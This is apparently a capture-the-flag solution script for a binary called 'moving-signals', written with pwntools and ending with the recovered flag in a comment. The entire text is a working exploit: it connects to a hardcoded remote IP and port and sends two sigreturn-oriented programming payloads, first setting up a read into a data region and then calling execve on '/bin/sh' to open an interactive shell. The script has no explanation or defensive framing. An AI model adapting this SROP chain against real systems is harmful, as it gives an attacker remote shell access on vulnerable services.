
from pwn import *

p = remote('161.97.176.150', 2525)

# p = process('./moving-signals')

context.clear(arch='amd64')
# context.log_level = 'debug'

syscall_ret = 0x41015
pop_rax = 0x41018 #: pop rax; ret;
data = 0x41800

payload = p64(0xAAAAAAAA)
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0x0
frame.rdi = 0x0
frame.rsi = data
frame.rdx = 0x400
frame.rsp = data + 8
frame.rbp = data+0x60
frame.rip = syscall_ret


payload += bytes(frame)

p.send(payload)

payload = b'/bin/sh\x00'
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = data
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload += bytes(frame)

p.sendline(payload)

p.interactive()

# flag{s1gROPp1ty_r0p_321321}